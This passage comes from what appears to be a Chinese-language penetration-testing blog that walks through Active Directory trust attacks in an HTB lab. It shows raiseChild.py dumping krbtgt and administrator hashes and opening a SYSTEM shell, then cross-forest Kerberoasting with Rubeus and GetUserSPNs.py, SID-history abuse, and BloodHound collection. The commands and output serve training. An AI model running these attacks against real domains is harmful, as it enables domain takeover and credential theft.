<h3 id="使用-raiseChild-py-执行攻击"><a href="#使用-raiseChild-py-执行攻击" class="headerlink" title="使用 raiseChild.py 执行攻击"></a>使用 raiseChild.py 执行攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm</span><br><span class="line"></span><br><span class="line">Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Forest FQDN is: INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL</span><br><span class="line">[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519</span><br><span class="line">[*] Getting credentials <span class="keyword">for</span> LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::</span><br><span class="line">LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8</span><br><span class="line">[*] Getting credentials <span class="keyword">for</span> INLANEFREIGHT.LOCAL</span><br><span class="line">INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::</span><br><span class="line">INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d</span><br><span class="line">[*] Target User account name is administrator</span><br><span class="line">INLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::</span><br><span class="line">INLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6</span><br><span class="line">[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file BnEGssCE.exe</span><br><span class="line">[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....</span><br><span class="line">[*] Creating service UVNb on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....</span><br><span class="line">[*] Starting service UVNb.....</span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">Microsoft Windows [Version 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">exit</span></span><br><span class="line">[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0</span><br><span class="line">[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....</span><br><span class="line">[*] Stopping service UVNb.....</span><br><span class="line">[*] Removing service UVNb.....</span><br></pre></td></tr></table></figure>

<h1 id="打破界限-跨林攻击"><a href="#打破界限-跨林攻击" class="headerlink" title="打破界限 - 跨林攻击"></a>打破界限 - 跨林攻击</h1><h2 id="跨林-Kerberoasting"><a href="#跨林-Kerberoasting" class="headerlink" title="跨林 Kerberoasting"></a>跨林 Kerberoasting</h2><p>Kerberos 攻击，如 Kerberoasting 和 ASREPRoasting，可以在信任关系的基础上进行跨域操作，具体取决于信任方向。当你处于一个具有入站或双向域&#x2F;林信任的域中时，你很可能能够执行各种攻击以获取立足点。有时你可能无法在当前域中提升权限，但可以获取另一个域中的 Kerberos 票据并破解哈希，从而获得在两个域中均具有域&#x2F;企业管理员权限的管理员用户。</p>
<h3 id="使用-Get-DomainUser-枚举关联-SPN-的账户"><a href="#使用-Get-DomainUser-枚举关联-SPN-的账户" class="headerlink" title="使用 Get-DomainUser 枚举关联 SPN 的账户"></a>使用 Get-DomainUser 枚举关联 SPN 的账户</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-SPN</span> <span class="literal">-Domain</span> FREIGHTLOGISTICS.LOCAL | <span class="built_in">select</span> SamAccountName</span><br><span class="line"></span><br><span class="line">samaccountname</span><br><span class="line"><span class="literal">--------------</span></span><br><span class="line">krbtgt</span><br><span class="line">mssqlsvc</span><br></pre></td></tr></table></figure>

<h3 id="枚举-mssqlsvc-账户"><a href="#枚举-mssqlsvc-账户" class="headerlink" title="枚举 mssqlsvc 账户"></a>枚举 mssqlsvc 账户</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-Domain</span> FREIGHTLOGISTICS.LOCAL <span class="literal">-Identity</span> mssqlsvc |<span class="built_in">select</span> samaccountname,memberof</span><br><span class="line"></span><br><span class="line">samaccountname memberof</span><br><span class="line"><span class="literal">--------------</span> <span class="literal">--------</span></span><br><span class="line">mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL</span><br></pre></td></tr></table></figure>

<h3 id="使用-Rubeus-进行-Kerberoasting-攻击并使用-domain-标志"><a href="#使用-Rubeus-进行-Kerberoasting-攻击并使用-domain-标志" class="headerlink" title="使用 Rubeus 进行 Kerberoasting 攻击并使用 &#x2F;domain 标志"></a>使用 Rubeus 进行 Kerberoasting 攻击并使用 &#x2F;domain 标志</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">0.2</span></span><br><span class="line"></span><br><span class="line">[*] Action: Kerberoasting</span><br><span class="line"></span><br><span class="line">[*] NOTICE: AES hashes will be returned <span class="keyword">for</span> AES<span class="literal">-enabled</span> accounts.</span><br><span class="line">[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC <span class="keyword">for</span> these accounts.</span><br><span class="line"></span><br><span class="line">[*] Target User            : mssqlsvc</span><br><span class="line">[*] Target Domain          : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">[*] Searching path <span class="string">&#x27;LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] Total kerberoastable users : <span class="number">1</span></span><br><span class="line"></span><br><span class="line">[*] SamAccountName         : mssqlsvc</span><br><span class="line">[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL</span><br><span class="line">[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:<span class="number">1433</span></span><br><span class="line">[*] PwdLastSet             : <span class="number">3</span>/<span class="number">24</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">47</span>:<span class="number">52</span> PM</span><br><span class="line">[*] Supported ETypes       : RC4_HMAC_DEFAULT</span><br><span class="line">[*] Hash                   : <span class="variable">$krb5tgs</span><span class="variable">$23</span><span class="variable">$</span>*mssqlsvc<span class="variable">$FREIGHTLOGISTICS</span>.LOCAL<span class="variable">$MSSQLsvc</span>/sql01.freightlogstics:<span class="number">1433</span>@FREIGHTLOGISTICS.LOCAL*<span class="variable">$</span>&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h2 id="管理员密码重用与组权限"><a href="#管理员密码重用与组权限" class="headerlink" title="管理员密码重用与组权限"></a>管理员密码重用与组权限</h2><p>时不时地，我们会遇到一种情况，即由同一家公司的管理员管理的双向林信任。如果我们能够接管域 A 并获取内置管理员账户（或属于域 A 中企业管理员或域管理员组的账户）的明文密码或 NT 哈希，而域 B 中存在一个具有相同名称的高权限账户，那么值得检查这两个林之间的密码重用情况。我偶尔会遇到这样的问题，例如，域 A 中有一个名为 <code>adm_bob.smith</code> 的用户在域管理员组中，而域 B 中有一个名为 <code>bsmith_admin</code> 的用户。有时，用户会在两个域中使用相同的密码，而拥有域 A 会立即赋予我对域 B 的完全管理权限。</p>
<h3 id="使用-Get-DomainForeignGroupMember"><a href="#使用-Get-DomainForeignGroupMember" class="headerlink" title="使用 Get-DomainForeignGroupMember"></a>使用 Get-DomainForeignGroupMember</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainForeignGroupMember</span> <span class="literal">-Domain</span> FREIGHTLOGISTICS.LOCAL</span><br><span class="line"></span><br><span class="line">GroupDomain             : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">GroupName               : Administrators</span><br><span class="line">GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL</span><br><span class="line">MemberDomain            : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">MemberName              : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-500</span></span><br><span class="line">MemberDistinguishedName : CN=S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-500</span>,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS</span><br><span class="line">                          TICS,DC=LOCAL</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Convert-SidToName</span> S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-500</span></span><br><span class="line"></span><br><span class="line">INLANEFREIGHT\administrator</span><br></pre></td></tr></table></figure>

<h3 id="使用-Enter-PSSession-访问-DC03"><a href="#使用-Enter-PSSession-访问-DC03" class="headerlink" title="使用 Enter-PSSession 访问 DC03"></a>使用 Enter-PSSession 访问 DC03</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> ACADEMY<span class="literal">-EA-DC03</span>.FREIGHTLOGISTICS.LOCAL <span class="literal">-Credential</span> INLANEFREIGHT\administrator</span><br><span class="line"></span><br><span class="line">[<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC03.FREIGHTLOGISTICS.LOCAL</span>]: <span class="built_in">PS</span> C:\Users\administrator.INLANEFREIGHT\Documents&gt; whoami</span><br><span class="line">inlanefreight\administrator</span><br><span class="line"></span><br><span class="line">[<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC03.FREIGHTLOGISTICS.LOCAL</span>]: <span class="built_in">PS</span> C:\Users\administrator.INLANEFREIGHT\Documents&gt; ipconfig /all</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line">   Host Name . . . . . . . . . . . . : ACADEMY<span class="literal">-EA-DC03</span></span><br><span class="line">   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">   Node <span class="built_in">Type</span> . . . . . . . . . . . . : Hybrid</span><br><span class="line">   IP Routing Enabled. . . . . . . . : No</span><br><span class="line">   WINS Proxy Enabled. . . . . . . . : No</span><br><span class="line">   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL</span><br></pre></td></tr></table></figure>

<h2 id="SID-历史记录滥用-跨林"><a href="#SID-历史记录滥用-跨林" class="headerlink" title="SID 历史记录滥用 - 跨林"></a>SID 历史记录滥用 - 跨林</h2><p>SID History 也可能被滥用跨越林信任。如果一个用户从一个林迁移到另一个林，且未启用 SID 过滤，则可以添加来自另一个林的 SID，并在跨信任进行身份验证时，此 SID 将被添加到用户的令牌中。如果林 A 中具有管理权限的账户的 SID 被添加到林 B 中某个账户的 SID History 属性中，假设他们能够跨林进行身份验证，那么该账户在访问合作伙伴林中的资源时将拥有管理权限。在下图中，我们可以看到 <code>jjones</code> 用户从 <code>INLANEFREIGHT.LOCAL</code> 域迁移到不同林中的 <code>CORP.LOCAL</code> 域的示例。如果在进行此迁移时未启用 SID 过滤，并且用户在 <code>INLANEFREIGHT.LOCAL</code> 域中拥有管理权限（或任何类型的有趣权限，如 ACE 条目、访问共享等），那么他们将在成为第二个林中 <code>CORP.LOCAL</code> 新域的成员时，保留在 <code>INLANEFREIGHT.LOCAL</code> 中的管理权限&#x2F;访问权限。</p>
<h2 id="跨林-Kerberoasting-Linux"><a href="#跨林-Kerberoasting-Linux" class="headerlink" title="跨林 Kerberoasting(Linux)"></a>跨林 Kerberoasting(Linux)</h2><h3 id="使用-GetUserSPNs-py"><a href="#使用-GetUserSPNs-py" class="headerlink" title="使用 GetUserSPNs.py"></a>使用 GetUserSPNs.py</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley</span><br><span class="line"></span><br><span class="line">Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation </span><br><span class="line">-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------</span><br><span class="line">MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  &lt;never&gt; </span><br></pre></td></tr></table></figure>

<h3 id="使用-request-标志"><a href="#使用-request-标志" class="headerlink" title="使用 -request 标志"></a>使用 -request 标志</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  </span><br><span class="line"></span><br><span class="line">Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation </span><br><span class="line">-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------</span><br><span class="line">MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  &lt;never&gt;               </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$krb5tgs$23$*mssqlsvc<span class="variable">$FREIGHTLOGISTICS</span>.LOCAL<span class="variable">$FREIGHTLOGISTICS</span>.LOCAL/mssqlsvc*<span class="variable">$10</span>&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p>假设我们能够跨信任关系进行 Kerberoast 攻击，并且在当前域中已无计可施。在这种情况下，尝试使用破解的密码进行一次单次密码喷洒也是值得的，因为如果相同的管理员负责两个域，该密码可能被用于其他服务账户。这里，我们再次展示了迭代测试的重要性，以及不遗余力地探索所有可能性。</p>
<h2 id="使用-Bloodhound-python-追踪外部组成员身份"><a href="#使用-Bloodhound-python-追踪外部组成员身份" class="headerlink" title="使用 Bloodhound-python 追踪外部组成员身份"></a>使用 Bloodhound-python 追踪外部组成员身份</h2><p>如上一节所述，我们可能会不时看到来自一个域的用户或管理员成为另一个域中某个组的成员。由于只有 <code>Domain Local Groups</code> 允许来自其森林外的用户，因此在处理双向森林信任关系时，看到来自域 A 的高权限用户成为域 B 内置管理员组的成员并不罕见。如果我们从 Linux 主机进行测试，可以使用 BloodHound 的 Python 实现来收集这些信息。我们可以利用此工具从多个域收集数据，将其导入 GUI 工具并搜索这些关系。</p>
<h3 id="针对-INLANEFREIGHT-LOCAL-运行-bloodhound-python"><a href="#针对-INLANEFREIGHT-LOCAL-运行-bloodhound-python" class="headerlink" title="针对 INLANEFREIGHT.LOCAL 运行 bloodhound-python"></a>针对 INLANEFREIGHT.LOCAL 运行 bloodhound-python</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ <span class="built_in">cat</span> /etc/resolv.conf </span><br><span class="line"></span><br><span class="line"><span class="comment"># Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)</span></span><br><span class="line"><span class="comment">#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN</span></span><br><span class="line"><span class="comment"># 127.0.0.53 is the systemd-resolved stub resolver.</span></span><br><span class="line"><span class="comment"># run &quot;resolvectl status&quot; to see details about the actual nameservers.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#nameserver 1.1.1.1</span></span><br><span class="line"><span class="comment">#nameserver 8.8.8.8</span></span><br><span class="line">domain INLANEFREIGHT.LOCAL</span><br><span class="line">nameserver 172.16.5.5</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2</span><br><span class="line"></span><br><span class="line">INFO: Found AD domain: inlanefreight.local</span><br><span class="line">INFO: Connecting to LDAP server: ACADEMY-EA-DC01</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 2 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 559 computers</span><br><span class="line">INFO: Connecting to LDAP server: ACADEMY-EA-DC01</span><br><span class="line">INFO: Found 2950 <span class="built_in">users</span></span><br><span class="line">INFO: Connecting to GC LDAP server: ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">INFO: Found 183 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 2 trusts</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h1 id="总结思考"><a href="#总结思考" class="headerlink" title="总结思考"></a>总结思考</h1><p>吸收关于 Active Directory 安全的所有知识，并熟悉不同团队和威胁行为者使用的战术、技术和程序（TTPs），将使我们走得更远。MITRE 的企业攻击矩阵是一个研究攻击及其相应工具和防御的好地方。AD 是一个广阔的主题，需要时间来掌握。新的漏洞向量和概念验证攻击经常发布。这个话题不会消失，因此利用现有资源保持领先地位，并保持网络的主动安全。无论是作为渗透测试人员还是防御者，对 AD 及其相关工具的基本理解将使我们保持最新状态。我们对大局了解得越多，作为攻击者和防御者，我们的能力就越强，我们能为客户和我们所服务的公司提供的价值就越大。提升安全性是我们的重点，但这并不意味着我们不能在过程中享受乐趣。</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/about/">关于</a></li>
        
          <li><a href="/archives/">归档</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/c2tsh4rk">项目</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8E%E5%88%9D%E5%A7%8B%E4%BE%A6%E6%9F%A5%E5%88%B0%E8%8E%B7%E5%8F%96%E7%AB%8B%E8%B6%B3%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">从初始侦查到获取立足点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-osint%E8%8E%B7%E5%8F%96%E5%88%B0%E4%BB%BB%E4%BD%95%E6%9C%89%E4%BB%B7%E5%80%BC%E7%9A%84%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">1. osint获取到任何有价值的用户信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E4%BE%A6%E6%9F%A5"><span class="toc-number">1.2.</span> <span class="toc-text">2. 本地账户侦查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LLMNR-NBT-NS-Poisoning"><span class="toc-number">1.2.1.</span> <span class="toc-text">LLMNR&#x2F;NBT-NS Poisoning</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%9E%9A%E4%B8%BE%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5"><span class="toc-number">1.3.</span> <span class="toc-text">3. 枚举密码策略</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-NULL"><span class="toc-number">1.3.1.</span> <span class="toc-text">SMB NULL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-Anomynous"><span class="toc-number">1.3.2.</span> <span class="toc-text">LDAP Anomynous</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%90%8D%E5%88%97%E8%A1%A8"><span class="toc-number">1.4.</span> <span class="toc-text">4. 获取用户名列表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-NULL-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">SMB NULL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-Anonymous"><span class="toc-number">1.4.2.</span> <span class="toc-text">LDAP Anonymous</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerbrute-%E9%80%9A%E8%BF%87Kerberos-Pre-Authentication"><span class="toc-number">1.4.3.</span> <span class="toc-text">Kerbrute(通过Kerberos Pre-Authentication)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-number">1.5.</span> <span class="toc-text">5. 密码喷洒</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AD-%E8%8E%B7%E5%8F%96%E5%88%9D%E5%A7%8B%E6%9D%83%E9%99%90%E5%90%8E%E7%9A%84%E6%9E%9A%E4%B8%BE"><span class="toc-number">2.</span> <span class="toc-text">AD 获取初始权限后的枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%9E%9A%E4%B8%BE%E5%AE%89%E5%85%A8%E6%8E%A7%E5%88%B6"><span class="toc-number">2.1.</span> <span class="toc-text">1. 枚举安全控制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%9E%9A%E4%B8%BEAppLocker%E7%AD%96%E7%95%A5"><span class="toc-number">2.2.</span> <span class="toc-text">2. 枚举AppLocker策略</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90-Get-AppLockerPolicy-Effective-%E7%BB%93%E6%9E%9C"><span class="toc-number">2.2.1.</span> <span class="toc-text">解析 Get-AppLockerPolicy -Effective 结果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%9E%9A%E4%B8%BE%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%BC%8F"><span class="toc-number">2.3.</span> <span class="toc-text">3. 枚举语言模式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%9E%9A%E4%B8%BELAPS"><span class="toc-number">2.4.</span> <span class="toc-text">4. 枚举LAPS</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E4%B8%80%E4%B8%AA%E5%9F%9F%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE%E5%90%8E%E7%9A%84%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.</span> <span class="toc-text">获取一个域用户凭据后的枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-CME-%E5%9F%9F%E7%94%A8%E6%88%B7-%E7%BB%84-%E5%B7%B2%E7%99%BB%E5%BD%95%E7%94%A8%E6%88%B7-share%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.1.</span> <span class="toc-text">1. CME - 域用户&#x2F;组&#x2F;已登录用户&#x2F;share枚举</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-SMBMap-%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E6%A3%80%E6%9F%A5-%E9%80%92%E5%BD%92%E7%9B%AE%E5%BD%95"><span class="toc-number">3.2.</span> <span class="toc-text">2. SMBMap - 访问权限检查&#x2F;递归目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-rpcclient-%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.3.</span> <span class="toc-text">3. rpcclient 枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-RID-%E8%BF%9B%E8%A1%8C-RPCClient-%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.3.1.</span> <span class="toc-text">通过 RID 进行 RPCClient 用户枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumdomusers-%E6%9E%9A%E4%B8%BE%E5%9F%9F%E7%94%A8%E6%88%B7"><span class="toc-number">3.3.2.</span> <span class="toc-text">Enumdomusers 枚举域用户</span></a></li></ol></li><li 